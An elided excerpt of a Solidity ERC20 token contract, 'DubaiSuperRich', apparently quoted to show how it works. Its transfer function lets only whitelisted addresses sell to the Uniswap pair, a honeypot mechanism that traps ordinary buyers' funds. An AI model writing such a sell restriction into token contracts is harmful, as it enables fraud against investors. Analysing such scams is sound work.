...
contract Token is ERC20,Ownable,WhiteList {
    ...
    constructor(address addr,address routerAddress_) ERC20("DubaiSuperRich","DubaiSR"){
        super._mint(addr, total);
        _uniswapV2Router = IUniswapV2Router02(routerAddress_);
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal virtual override{
        ...
        if(uniswapV2Pair == recipient){
            require(isWhiteListed(sender), "White list restriction");
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
